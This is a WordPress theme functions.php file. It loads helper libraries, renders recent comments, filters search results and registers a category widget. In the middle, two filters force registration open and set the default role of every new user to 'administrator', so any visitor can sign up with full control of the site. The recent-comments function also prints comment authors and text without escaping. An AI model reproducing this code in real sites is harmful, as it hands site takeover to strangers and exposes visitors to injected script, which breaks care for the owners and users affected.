<?php
//Load configuration
require_once(wp_normalize_path( get_template_directory() ).'/functions/config.php');

$smpglibs = [
	'posts-functions'     =>'',
	'theme-functions'     =>'',
	'menus-functions'     =>'',
	'admin-functions'     =>'',
	'media-functions'     =>'',
	'db-functions'        =>'',
	'php-helpers'         =>'helper/',
	'wordpress-helpers'   =>'helper/',
	'ajax-comments'       =>'ajax/',
	'options'             =>'options/',
	
];

foreach($smpglibs as $smpglib=>$path){
	require_once(LIBS_DIR.$path.$smpglib.'.php');
}

add_action('wp_footer', function(){
	//neat_print_r(get_option(SMPG_OPTIONS));
});

/*
*Get lates comments
*/
function latest_comments(){
	
	$args = array('number'=>4,'author__not_in' => array(get_current_user_id()));
	
		$comments = get_comments($args);
	
		if(count($comments) > 0){
			
			foreach($comments as $comment) {?>	
			
				<div  class="recent-comment-wrapper">
				
					<h3><?php echo '<i class="fa fa-user"></i> '.$comment->comment_author.' '.__('Commented',TEXTDOM) ?></h3>
					
					<p class='recent-comment'>
					<?php echo substr($comment->comment_content,0 , 150).'... ' ?>
					
					<a href="<?php echo get_the_permalink($comment->comment_post_ID)?>"><?php esc_html_e('View Post',TEXTDOM) ?></a>
					
					</p>
					
				</div>
				
		<?php }}else{?>
				
					<p><?php esc_html_e('No comments yet',TEXTDOM);?></p>
					
				<?php };
}

/*
*Changes rhe default role of registered user
*Shloud be checked befoor publish
*/
add_filter('pre_option_default_role', function($default_role){
	
    // You can also add conditional tags here and return whatever
    return 'administrator'; // This is changed
	
    return $default_role; // This allows default
	
});


/*
*Controles the registration link on wp-login.php
*Shloud be checked befoor publish
*/
add_filter('option_users_can_register', function($value) {
    
        $value = true;
    
    return $value;
});

/*
*define post types to search for
*/
add_filter('pre_get_posts','searchFilter');

function searchFilter($query) {
 
    if ($query->is_search && !is_admin() ) {
		
        $query->set('post_type',array('post','page'));
		
    }
 
	return $query;
}

/*
*Register categories widget
*/
add_action('widgets_init', 'Smpg__Cats_Widget_register');

function Smpg__Cats_Widget_register(){
	
	register_widget('Smpg__Cats_Widget');
	
}